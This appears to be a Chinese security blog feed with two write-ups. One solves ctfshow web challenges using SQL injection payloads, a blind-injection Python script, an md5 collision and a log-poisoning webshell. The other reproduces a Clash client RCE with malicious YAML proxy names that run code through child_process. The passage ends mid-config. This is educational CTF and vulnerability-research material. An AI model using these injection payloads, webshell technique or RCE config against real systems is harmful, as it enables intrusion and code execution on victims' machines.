class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#查看flag表中的数据</span><br><span class="line">username<span class="operator">=</span>admin<span class="string">&#x27;or 1=1 union select 1,column_name,3 from information_schema.columns where table_name=&#x27;</span>flag<span class="string">&#x27;#&amp;password=1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#查看flag</span></span><br><span class="line"><span class="string">username=admin&#x27;</span><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,flag,<span class="number">3</span> <span class="keyword">from</span> flag#<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="/posts/fa386b67/image-20220306211624887.png" alt="image-20220306211624887"></p><h2 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h2><p>这题主要考察php的伪协议</p><p>详情可见<a href="https://segmentfault.com/a/1190000018991087#item-2">https://segmentfault.com/a/1190000018991087#item-2</a></p><p>这里使用php:&#x2F;&#x2F;input协议</p><p>使用phpinfo测试</p><p><img src="/posts/fa386b67/image-20220306221021594.png" alt="image-20220306221021594"></p><p><img src="/posts/fa386b67/image-20220306221052212.png" alt="image-20220306221052212"></p><p>接下来使用执行系统指令查看当前目录的文件夹</p><p><img src="/posts/fa386b67/image-20220306221503246.png" alt="image-20220306221503246"></p><p><img src="/posts/fa386b67/image-20220306221452532.png" alt="image-20220306221452532"></p><p>查看ctf_go_go_go文件</p><p><img src="/posts/fa386b67/y76O4rWLDawEQkf.png" alt="image-20220306221738302"></p><h2 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h2><p><img src="/posts/fa386b67/xO9wgrz37jAsacW.png" alt="image-20220307192056465"></p><p>请求头看到是nginx搭建</p><p>查看nginx日志</p><p>?url&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p><img src="/posts/fa386b67/XENCDzcxQMIJBYe.png" alt="image-20220307190214602"></p><p>发现日志文件尝试在日志中插入一句话木马</p><p>先抓个包</p><p><img src="/posts/fa386b67/UvjlyFfXSzPW9hE.png" alt="image-20220307212115102"></p><p>添加一句话木马</p><p>蚁剑连接</p><p><img src="/posts/fa386b67/2b1WhsZmnOJviBo-165900179393549.png" alt="image-20220307212247404"></p><p><img src="/posts/fa386b67/image-20220307212323762-165900180009251.png" alt="image-20220307212323762"></p><h2 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">        <span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$v1</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;v1 error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;v2 error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">md5</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;       </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;where is flag?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ctype_alpha()函数:如果参数为字符串字母则返回Ture否则Flase</p><p>is_numeric()函数:如果参数为数字和数字字符串则返回Ture否则Flase浮点型返回1，即 TRUE。</p><p>也就是v1为字母 v2为数字</p><p>这里主要利用php md5碰撞</p><p>md5碰撞介绍：<br>PHP在处理哈希字符串时，会利用”!&#x3D;”或”&#x3D;&#x3D;”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p><p>详情<a href="https://blog.csdn.net/anzhuangguai/article/details/70049960">https://blog.csdn.net/anzhuangguai/article/details/70049960</a></p><p>payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1<span class="operator">=</span>QNKCDZO<span class="operator">&amp;</span>v2<span class="operator">=</span><span class="number">240610708</span></span><br></pre></td></tr></table></figure><h2 id="Web6"><a href="#Web6" class="headerlink" title="Web6"></a>Web6</h2><p><img src="/posts/fa386b67/yBGzlZCi91at7dI-165900180559753.png" alt="image-20220308163456072"></p><p>一个登录框</p><p>首先试下万能密码</p><p><img src="/posts/fa386b67/XwL9IrkHMRs4mVo-165900180799355.png" alt="image-20220308163528102"></p><p>抓包看下</p><p><img src="/posts/fa386b67/QmMS7b2436LWpeV-165900181035357.png" alt="image-20220308164012827"></p><p>发现空格被过滤了</p><p>使用&#x2F;**&#x2F;代替空格</p><p><img src="/posts/fa386b67/QCr5n3YBJRK4UiE-165900181265759.png" alt="image-20220308164039336"></p><p>登录成功 接下来猜字段</p><p><img src="/posts/fa386b67/jE2Js8S9QbZqTrU.png" alt="image-20220308164922763"></p><p>3个字段 继续使用union 查看回显</p><p><img src="/posts/fa386b67/bMl86JAiyUjoQ2I.png" alt="image-20220308165004852"></p><p>2处为回显</p><p>接下来进行注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查看数据库</span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">%</span><span class="number">27</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span><span class="operator">%</span><span class="number">3</span>D1<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,database(),<span class="number">3</span><span class="operator">%</span><span class="number">23</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="/posts/fa386b67/yiXDlJ8wbvjensg-165900182072165.png" alt="image-20220308165558090"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查表</span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">%</span><span class="number">27</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span><span class="operator">%</span><span class="number">3</span>D1<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(table_name),<span class="number">3</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema<span class="operator">=</span>database()<span class="operator">%</span><span class="number">23</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="/posts/fa386b67/9zPsoXm173dNgGw-165900182504967.png" alt="image-20220308165542589"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查字段</span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">%</span><span class="number">27</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span><span class="operator">%</span><span class="number">3</span>D1<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(column_name),<span class="number">3</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.columns<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span><span class="operator">%</span><span class="number">23</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="/posts/fa386b67/mnWQfT94YyG1N83-165900182771769.png" alt="image-20220308165841243"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查数据</span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">%</span><span class="number">27</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span><span class="operator">%</span><span class="number">3</span>D1<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,flag,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flag<span class="operator">%</span><span class="number">23</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>得到flag</p><h2 id="Web7"><a href="#Web7" class="headerlink" title="Web7"></a>Web7</h2><p>随便点一个</p><p><img src="/posts/fa386b67/MNYT1oehSVHamZv.png" alt="image-20220309233612766"></p><p>看url应该是sql注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br></pre></td></tr></table></figure><p><img src="/posts/fa386b67/34opSrgjQGvZdKw-165900183166571.png" alt="image-20220309233721194"></p><p>抓包看下</p><p>应该是空格被过滤了</p><p>用&#x2F;**&#x2F;试下</p><p><img src="/posts/fa386b67/ekz96oF8faOEXBr-165900183700675.png" alt="image-20220309234057695"></p><p>正常了</p><p>看回显</p><p><img src="/posts/fa386b67/aEdQO9VhzUipkKr-165900184015977.png" alt="image-20220309234458637"></p><p>2，3</p><p>根据前面的题盲猜应该还是flag表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,flag,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flag<span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><p><img src="/posts/fa386b67/kSiKWDsMnBgLT5u-165900184312779.png" alt="image-20220309234528344"></p><h2 id="Web8"><a href="#Web8" class="headerlink" title="Web8"></a>Web8</h2><p>和上一关一样存在sql注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br></pre></td></tr></table></figure><p><img src="/posts/fa386b67/image-20220310225247255.png" alt="image-20220310225247255"></p><p>使用union看回显</p><p><img src="/posts/fa386b67/image-20220310225316125.png" alt="image-20220310225316125"></p><p>报错了</p><p>应该是过滤了union或者select</p><p>这里使用盲注</p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.session()</span><br><span class="line">url=<span class="string">&#x27;http://273325e5-2d7d-49b3-ab29-95181b40a737.challenge.ctf.show/index.php&#x27;</span></span><br><span class="line">table=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="comment">#爆表名  flag</span></span><br><span class="line">        <span class="comment">#payload = &quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span></span><br><span class="line">        <span class="comment">#爆字段名 flag</span></span><br><span class="line">        <span class="comment">#payload = &quot;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span></span><br><span class="line">        <span class="comment">#读取flag</span></span><br><span class="line">        payload = <span class="string">&quot;ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#&quot;</span>%(<span class="built_in">str</span>(i), <span class="built_in">str</span>(j))</span><br><span class="line"></span><br><span class="line">        ra = s.get(url=url + <span class="string">&#x27;?id=0/**/or/**/&#x27;</span> + payload).text</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;I asked nothing&#x27;</span> <span class="keyword">in</span> ra:</span><br><span class="line">            table += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(table)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>flag:</p><p><img src="/posts/fa386b67/image-20220310232534339.png" alt="image-20220310232534339"></p><h2 id="Web9"><a href="#Web9" class="headerlink" title="Web9"></a>Web9</h2><p><img src="/posts/fa386b67/image-20220311212421282.png" alt="image-20220311212421282"></p><p>打开就是一个登录界面，只有账号没有密码</p><p>本以为是sql注入，但试了很多payload都没有回显</p><p>使用目录扫描工具扫下</p><p>发现robots.txt</p><p><img src="/posts/fa386b67/image-20220311213312985.png" alt="image-20220311213312985"></p><p>看下是什么</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)&gt;<span class="number">10</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;password error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到sql语句为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;.md5($password,<span class="literal">true</span>).&quot;&#x27;&quot;;   </span><br></pre></td></tr></table></figure><p><img src="/posts/fa386b67/image-20220311213635981.png" alt="image-20220311213635981"></p><p>也就是我们的passwd要传入一个经过md5加密后16进制转字符串后包含‘or’的值</p><p>例如：<strong>ffifdyop</strong></p><p><img src="/posts/fa386b67/image-20220311214754459.png" alt="image-20220311214754459"></p><h2 id="Web10"><a href="#Web10" class="headerlink" title="Web10"></a>Web10</h2><p>打开又是一个登录框</p><p><img src="/posts/fa386b67/image-20220312212750883.png" alt="image-20220312212750883"></p><p>点击取消出现源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">             <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>());</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$username</span>)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$password</span>)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from user where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到select，sleep 等等都被过滤了</p><p>同时没有办法使用双写绕过</p><p>可以使用group by</p><p>group up 会按照后的参数进行排列</p><p>group by 后可以跟with rollup，表示在进行分组统计的基础上再次进行汇总统计</p><p><code>with rollup</code>的作用是：在最后记录后面新增一行，显示select查询时聚合函数的统计和计算结果</p><p>也就是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> 列名  <span class="keyword">WITH</span> <span class="keyword">ROLLUP</span></span><br></pre></td></tr></table></figure><p>这是不使用WITH ROLLUP的效果</p><p><img src="/posts/fa386b67/image-20220312224015749.png" alt="image-20220312224015749"></p><p>这是使用WITH ROLLUP的效果</p><p><img src="/posts/fa386b67/image-20220312224040151.png" alt="image-20220312224040151"></p><p>可以看出多了一行password多出了一个NULL对应的值为4也就是前面2+1+1的值 也就是说在group by的基础上WITH ROLLUP又把前面的值汇总了一遍</p><p>利用这一特性我们就可以进行绕过</p><p>payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>admin<span class="string">&#x27;/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#&amp;password=</span></span><br></pre></td></tr></table></figure><p><img src="/posts/fa386b67/image-20220312224702958.png" alt="image-20220312224702958"></p><p>拿到flag</p><p><img src="/posts/fa386b67/image-20220312224233107.png" alt="image-20220312224233107"></p><h2 id="萌新专属红包题"><a href="#萌新专属红包题" class="headerlink" title="萌新专属红包题"></a>萌新专属红包题</h2><p>打开靶机发现一个登录界面，试下弱口令</p><p>admin admin888</p><p><img src="/posts/fa386b67/image-20220306182257359.png" alt="image-20220306182257359"></p><p>看到一张图片F12看下源码</p><p><img src="/posts/fa386b67/image-20220306182357918.png" alt="image-20220306182357918"></p><p>发现一行神秘编码 base64解码下</p><p><img src="/posts/fa386b67/image-20220306182428648.png" alt="image-20220306182428648"></p><p>发现只有一半 接下来找一找另一半</p><p>把图片下载下来</p><p>在详细信息里发现了</p><p><img src="/posts/fa386b67/image-20220306182517451.png" alt="image-20220306182517451"></p><p>解码</p><p><img src="/posts/fa386b67/image-20220306182543998.png" alt="image-20220306182543998"></p><p>搞定提交</p><p><img src="/posts/fa386b67/image-20220306182802861.png" alt="image-20220306182802861"></p><p>？？？ 假的flag改了大小写还是不行重新试下</p><p>登录抓包</p><p><img src="/posts/fa386b67/image-20220306183022208.png" alt="image-20220306183022208"></p><p>我去。。。。</p><p>base解码这次成功了。。</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Clash RCE漏洞复现分析</title>
      <link href="/posts/cb677a8d/"/>
      <url>/posts/cb677a8d/</url>
      
        <content type="html"><![CDATA[<h1 id="Clash-RCE漏洞复现分析"><a href="#Clash-RCE漏洞复现分析" class="headerlink" title="Clash RCE漏洞复现分析"></a>Clash RCE漏洞复现分析</h1><blockquote><p>请各位师傅们务必在本地进行测试，切勿用于非法用途，后果自负。</p></blockquote><blockquote><p>影响范围：</p><p>已知版本&lt;0.19.10受其影响</p></blockquote><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><blockquote><p>Clash：一个 Go 语言开发的多平台代理客户端，懂得都懂</p></blockquote><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>版本需要小于0.19.10</p><p>打开clash选择配置(Profiles)</p><p><img src="/posts/cb677a8d/image-20220228221010788.png" alt="image-20220228221010788"><br>导入POC文件</p><blockquote><p>POC下载：<a href="https://github.com/fattygo/poc-">https://github.com/fattygo/poc-</a></p></blockquote><p>右键连接代理（Proxies）</p><p><img src="/posts/cb677a8d/image-20220228222445170.png" alt="image-20220228222445170"></p><p>执行成功</p><p><img src="/posts/cb677a8d/image-20220228222517633.png" alt="image-20220228222517633"></p><blockquote><p>本次复现仅供学习，切勿用于非法用途，后果自负。</p></blockquote><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>先看下正常的代理yml文件</p><p>节点之一</p><p><img src="/posts/cb677a8d/image-20220301224509405.png" alt="image-20220301224509405"></p><p>在Clash中的展示为</p><p><img src="/posts/cb677a8d/image-20220301224603800.png" alt="image-20220301224603800"></p><p>不难看出，proxies中的name和type，proxy-groups都展示了出来，这里就联想到xss漏洞</p><p>写个yml来试下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">port:</span> <span class="number">7890</span></span><br><span class="line"><span class="attr">socks-port:</span> <span class="number">7891</span></span><br><span class="line"><span class="attr">redir-port:</span> <span class="number">7892</span></span><br><span class="line"><span class="attr">allow-lan:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">mode:</span> <span class="string">Rule</span></span><br><span class="line"><span class="attr">log-level:</span> <span class="string">silent</span></span><br><span class="line"><span class="attr">external-controller:</span> <span class="string">&#x27;0.0.0.0:9090&#x27;</span></span><br><span class="line"><span class="attr">secret:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="attr">proxies:</span></span><br><span class="line">  <span class="bullet">-</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">&#x27;&lt;img src=x onerror=alert(1) /&gt;&#x27;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">trojan</span></span><br><span class="line">    <span class="attr">server:</span> <span class="string">test</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">45645</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">20133544</span><span class="number">-3417</span><span class="number">-3062</span><span class="string">-8ff8-b1dbd032948f</span></span><br></pre></td></tr></table></figure><p>连接代理</p><p><img src="/posts/cb677a8d/image-20220301225601973.png" alt="image-20220301225601973"></p><p><img src="/posts/cb677a8d/image-20220301225620728.png" alt="image-20220301225620728"></p><p>成功弹窗，因此证明了XSS漏洞存在</p><p>接下来改为RCE漏洞试下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">port:</span> <span class="number">7890</span></span><br><span class="line"><span class="attr">socks-port:</span> <span class="number">7891</span></span><br><span class="line"><span class="attr">redir-port:</span> <span class="number">7892</span></span><br><span class="line"><span class="attr">allow-lan:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">mode:</span> <span class="string">Rule</span></span><br><span class="line"><span class="attr">log-level:</span> <span class="string">silent</span></span><br><span class="line"><span class="attr">external-controller:</span> <span class="string">&#x27;0.0.0.0:9090&#x27;</span></span><br><span class="line"><span class="attr">secret:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="attr">proxies:</span></span><br><span class="line">  <span class="bullet">-</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">&#x27;&lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt;&#x27;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">trojan</span></span><br><span class="line">    <span class="attr">server:</span> <span class="string">test</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">45645</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">20133544</span><span class="number">-3417</span><span class="number">-3062</span><span 